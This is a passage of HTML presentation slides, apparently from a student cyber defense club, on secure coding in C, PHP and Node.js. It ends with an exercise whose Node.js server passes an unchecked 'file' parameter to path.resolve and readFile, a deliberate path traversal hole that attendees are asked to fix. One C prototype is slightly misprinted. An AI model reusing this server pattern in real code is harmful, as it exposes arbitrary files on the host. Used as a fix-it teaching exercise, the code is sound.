+<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">fscanf</span><span style="color: #51afef;">(</span><span style="color: #a9a1e1;">FILE</span> <span style="color: #ECBE7B;">strict</span> <span style="color: #dcaeea;">stream</span>, <span style="color: #51afef;">const</span> <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">format</span>, ...<span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="fragment appear"   ><code trim><span style="color: #ECBE7B;">char</span> *<span style="color: #c678dd;">fgets</span><span style="color: #51afef;">(</span><span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">s</span>, <span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">size</span>, <span style="color: #ECBE7B;">FILE</span> *<span style="color: #dcaeea;">stream</span><span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+<p class="fragment appear">
+What&rsquo;s the main difference?
+</p>
+
+</section>
+<section id="slide-orge1dcc67" data-background="../common/background.png">
+<h3 id="orge1dcc67"><span class="section-number-3">9.3.</span> Where can you find vulnerabilities and alternatives like this?</h3>
+<p class="fragment appear">
+DuckDuckGo and Reddit
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org5cda9d5" data-background="../common/background.png">
+<h2 id="org5cda9d5"><span class="section-number-2">10.</span> How can we secure Example 2?</h2>
+<div class="outline-text-2" id="text-10">
+</div>
+</section>
+<section id="slide-org9c3c9be" data-background="../common/background.png">
+<h3 id="org9c3c9be"><span class="section-number-3">10.1.</span> Do not trust the types of your variables in weakly typed languages!</h3>
+<p>
+For PHP: <a href="https://www.php.net/manual/en/ref.var.php">https://www.php.net/manual/en/ref.var.php</a>
+</p>
+</section>
+<section id="slide-org6a34b10" data-background="../common/background.png">
+<h3 id="org6a34b10"><span class="section-number-3">10.2.</span> Enable strict error handling</h3>
+<p>
+Set strict error reporting level: <a href="https://www.php.net/manual/en/function.error-reporting.php">https://www.php.net/manual/en/function.error-reporting.php</a>
+</p>
+
+<div class="org-src-container">
+
+<pre  class="fragment appear"   ><code trim>error_reporting<span style="color: #51afef;">(</span><span style="color: #a9a1e1;">E_ALL</span> | <span style="color: #a9a1e1;">E_STRICT</span><span style="color: #51afef;">)</span>;
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org7f410da" data-background="../common/background.png">
+<h3 id="org7f410da"><span class="section-number-3">10.3.</span> Understand the change of types of variables</h3>
+</section>
+</section>
+<section>
+<section id="slide-org71c83d4" data-background="../common/background.png">
+<h2 id="org71c83d4"><span class="section-number-2">11.</span> What can you do to code that isn&rsquo;t yours?</h2>
+<aside class="notes">
+<p>
+Include mention of DMs
+</p>
+
+</aside>
+
+<p class="fragment appear">
+Depends on the owner&rsquo;s code and policies
+</p>
+
+<p class="fragment appear">
+Google Bug Bounty program: <a href="https://bughunters.google.com/about/rules/6625378258649088" class="fragment appear">https://bughunters.google.com/about/rules/6625378258649088</a>
+</p>
+</section>
+</section>
+<section>
+<section id="slide-orgb313b6b" data-background="../common/background.png">
+<h2 id="orgb313b6b"><span class="section-number-2">12.</span> Wasn&rsquo;t this whole presentation just reverse engineering?</h2>
+<p class="fragment appear">
+Maybe&#x2026;
+</p>
+
+<p class="fragment appear">
+We need to know how to fix problems, not just identify and exploit them!
+</p>
+
+</section>
+</section>
+<section>
+<section id="slide-org20ef79e" data-background="../common/background.png">
+<h2 id="org20ef79e"><span class="section-number-2">13.</span> Club exercise!</h2>
+<div class="outline-text-2" id="text-13">
+</div>
+</section>
+<section id="slide-orga0e1dfb" data-background="../common/background.png">
+<h3 id="orga0e1dfb"><span class="section-number-3">13.1.</span> Situation description</h3>
+<p class="fragment appear">
+You are given a Node.js 16 server which provides user data
+</p>
+
+<p class="fragment appear">
+There is a <code>/users</code> folder which in turn has folders which contain user files
+</p>
+
+<p class="fragment appear">
+The server has to take the following parameters:
+</p>
+
+<ul class="fragment appear">
+<li>userId (required): A user ID number</li>
+<li>file (optional): The file to pull. Defaults to user.json</li>
+
+</ul>
+
+</section>
+<section id="slide-org03774b0" data-background="../common/background.png">
+<h3 id="org03774b0"><span class="section-number-3">13.2.</span> Challenge code</h3>
+<div class="org-src-container">
+
+<pre  class="src src-js"   ><code trim><span style="color: #5B6268;">// </span><span style="color: #5B6268;">Node.js 16</span>
+<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">fs</span>   = require(<span style="color: #98be65;">'node:fs'</span>);
+<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">http</span> = require(<span style="color: #98be65;">'node:http'</span>);
+<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">Url</span>  = require(<span style="color: #98be65;">'node:url'</span>);
+<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">path</span> = require(<span style="color: #98be65;">'node:path'</span>);
+
+<span style="color: #51afef;">const</span> <span style="color: #dcaeea;">server</span> = http.createServer((req, res) =&gt; {
+    <span style="color: #51afef;">if</span> (req.url.startsWith(<span style="color: #98be65;">'/user/'</span>)) {
+        <span style="color: #51afef;">const</span> <span style="color: #dcaeea;">url</span> = <span style="color: #51afef;">new</span> <span style="color: #ECBE7B;">Url.URL</span>(<span style="color: #98be65;">`http://${req.headers.host}${req.url}`</span>);
+
+        <span style="color: #51afef;">if</span> (url.searchParams.get(<span style="color: #98be65;">'userId'</span>) &amp;&amp; !isNaN(parseInt(url.searchParams.get(<span style="color: #98be65;">'userId'</span>)))) {
+            <span style="color: #5B6268;">// </span><span style="color: #5B6268;">Each user has a folder, go into that folder and get their user.json file</span>
+            <span style="color: #5B6268;">// </span><span style="color: #5B6268;">and return the text</span>
+            <span style="color: #51afef;">const</span> <span style="color: #dcaeea;">id</span> = url.searchParams.get(<span style="color: #98be65;">'userId'</span>);
+            <span style="color: #51afef;">const</span> <span style="color: #dcaeea;">userFile</span> = url.searchParams.get(<span style="color: #98be65;">'file'</span>) ?? <span style="color: #98be65;">'user.json'</span>;
+
+            <span style="color: #51afef;">const</span> <span style="color: #dcaeea;">filePath</span> = path.resolve(<span style="color: #98be65;">'/users'</span>, id, userFile);
+
+            fs.readFile(filePath, (err, text) =&gt; {
+                <span style="color: #51afef;">if</span> (err) <span style="color: #51afef;">throw</span> err;
+
+                res.write(text.toString());
+                res.end();
+            });
+        } <span style="color: #51afef;">else</span> {
+            res.statusCode = <span style="color: #da8548; font-weight: bold;">400</span>;
+            res.end();
+        }
+    } <span style="color: #51afef;">else</span> {
+        res.statusCode = <span style="color: #da8548; font-weight: bold;">404</span>;
+        res.end();
+    }
+});
+
+server.listen(<span style="color: #da8548; font-weight: bold;">8000</span>);
+</code></pre>
+</div>
+
+</section>
+<section id="slide-org7f5366d" data-background="../common/background.png">
+<h3 id="org7f5366d"><span class="section-number-3">13.3.</span> Code is located in same GitHub repository</h3>
+<p class="fragment appear">
+<a href="https://github.com/r-a303931/lucdc-presentations" class="fragment appear">https://github.com/r-a303931/lucdc-presentations</a>
+</p>
+
+<p class="fragment appear">
+<code>2022-02-03/challenges/challenge.js</code>
+</p>
+
+</section>
+<section id="slide-org279a157" data-background="../common/background.png">
+<h3 id="org279a157"><span class="section-number-3">13.4.</span> Your challenge:</h3>
+<p>
+Come up with a fix!
+</p>
+
+<p>
+Message me your fix in Discord (Andrew#3967)
+</p>
+</section>
+</section>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
+
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+transition: 'none',
+
+// Optional libraries used to extend on reveal.js
+dependencies: [
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }]
+
+});
+
+</script>
+</body>
+</html>
